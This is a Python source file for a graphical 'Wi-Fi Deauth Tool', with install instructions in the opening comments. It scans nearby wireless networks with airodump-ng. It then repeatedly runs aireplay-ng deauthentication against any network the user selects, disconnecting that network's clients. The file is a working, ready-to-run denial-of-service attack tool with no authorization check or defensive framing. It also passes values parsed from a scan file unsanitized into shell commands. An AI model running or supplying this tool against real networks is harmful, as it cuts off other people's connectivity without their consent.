# name the file deauth_gui.py
# in terminal type sudo spt update && sudo apt install aircrack-ng python3-scapy -y
# and then to runn it type sudo python3 (path to file)

import os
import subprocess
import csv
import threading
import tkinter as tk
from tkinter import ttk, messagebox

# Interface settings
interface = "wlan0mon"
original_interface = "wlan0"
scanning = False
attacking = False

# Enable monitor mode
def enable_monitor_mode():
    os.system(f"sudo airmon-ng start {original_interface} > /dev/null 2>&1")

# Disable monitor mode and restore Wi-Fi
def disable_monitor_mode():
    os.system(f"sudo airmon-ng stop {interface} > /dev/null 2>&1")
    os.system("sudo service NetworkManager restart")

# Scan for networks
def scan_networks():
    global scanning
    if scanning:
        return  
    scanning = True

    enable_monitor_mode()
    os.system("sudo rm -f scan_results-01.csv")  

    subprocess.Popen(
        ["sudo", "airodump-ng", "--write", "scan_results", "--output-format", "csv", interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    def update_list():
        while scanning:
            try:
                with open("scan_results-01.csv", "r", encoding="ISO-8859-1") as f:
                    reader = csv.reader(f)
                    networks = set()
                    for row in reader:
                        if len(row) > 13 and row[0] != "BSSID":
                            bssid = row[0].strip()
                            ssid = row[13].strip()
                            if ssid:
                                networks.add((ssid, bssid))
                    
                    network_list.delete(0, tk.END)
                    for ssid, bssid in networks:
                        network_list.insert(tk.END, f"{ssid} ({bssid})")
            except FileNotFoundError:
                pass  
            os.system("sleep 2")  

    threading.Thread(target=update_list, daemon=True).start()

# Stop scanning
def stop_scan():
    global scanning
    if scanning:
        scanning = False
        os.system("sudo pkill -f airodump-ng")

# Get network channel
def get_network_channel(target_mac):
    try:
        with open("scan_results-01.csv", "r", encoding="ISO-8859-1") as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) > 3 and row[0].strip() == target_mac:
                    return row[3].strip()  
    except FileNotFoundError:
        return None

# Start deauth attack
def start_deauth():
    global attacking
    if attacking:
        return  

    selected = network_list.get(tk.ACTIVE)
    if not selected:
        messagebox.showerror("Error", "Select a network first!")
        return

    stop_scan()  

    ssid, target_mac = selected.rsplit(" (", 1)
    target_mac = target_mac.strip(")")

    channel = get_network_channel(target_mac)
    if not channel:
        messagebox.showerror("Error", "Failed to get network channel!")
        return

    os.system(f"sudo iwconfig {interface} channel {channel}")  

    attacking = True
    messagebox.showinfo("Attack Started", f"Sending deauth packets to {ssid} ({target_mac}) on channel {channel}")

    def deauth_attack():
        while attacking:
            os.system(f"sudo aireplay-ng --deauth 10 -a {target_mac} {interface}")
    
    threading.Thread(target=deauth_attack, daemon=True).start()

# Stop deauth attack and restore Wi-Fi
def stop_deauth():
    global attacking
    if attacking:
        attacking = False
        disable_monitor_mode()
        messagebox.showinfo("Stopped", "Deauth attack stopped and Wi-Fi restored.")

# GUI Setup
root = tk.Tk()
root.title("Wi-Fi Deauth Tool")
root.geometry("500x400")
root.configure(bg="#2c2f36")  # Dark background

# Center the window
root.eval('tk::PlaceWindow . center')

# Styling
style = ttk.Style()
style.theme_use("clam")

# Customize ttk buttons & listbox for a dark theme
style.configure("TButton", font=("Segoe UI", 12), padding=10, relief="flat", background="#6200ea", foreground="white", borderwidth=0)
style.configure("TLabel", font=("Segoe UI", 14), background="#2c2f36", foreground="#e0e0e0")
style.configure("TListbox", font=("Segoe UI", 12), background="#3a3f47", foreground="#e0e0e0", relief="flat", height=10)

# Add hover effect for buttons
def on_enter(e):
    e.widget.config(background="#7c4dff")

def on_leave(e):
    e.widget.config(background="#6200ea")

# Title
title_label = ttk.Label(root, text="Wi-Fi Deauth Tool", font=("Segoe UI", 16, "bold"))
title_label.pack(pady=20)

# Listbox for networks
network_list = tk.Listbox(root, width=50, height=10, bg="#3a3f47", fg="#e0e0e0", font=("Segoe UI", 12), selectmode=tk.SINGLE, relief="flat")
network_list.pack(pady=20)

# Buttons
button_frame = tk.Frame(root, bg="#2c2f36")
button_frame.pack(pady=10)

scan_button = ttk.Button(button_frame, text="Start Scanning", command=scan_networks)
scan_button.grid(row=0, column=0, padx=10, pady=10)
scan_button.bind("<Enter>", on_enter)
scan_button.bind("<Leave>", on_leave)

stop_scan_button = ttk.Button(button_frame, text="Stop Scanning", command=stop_scan)
stop_scan_button.grid(row=0, column=1, padx=10, pady=10)
stop_scan_button.bind("<Enter>", on_enter)
stop_scan_button.bind("<Leave>", on_leave)

attack_button = ttk.Button(button_frame, text="Start Deauth", command=start_deauth)
attack_button.grid(row=1, column=0, padx=10, pady=10)
attack_button.bind("<Enter>", on_enter)
attack_button.bind("<Leave>", on_leave)

stop_attack_button = ttk.Button(button_frame, text="Stop Deauth & Restore Wi-Fi", command=stop_deauth)
stop_attack_button.grid(row=1, column=1, padx=10, pady=10)
stop_attack_button.bind("<Enter>", on_enter)
stop_attack_button.bind("<Leave>", on_leave)

# Run the GUI
root.mainloop()
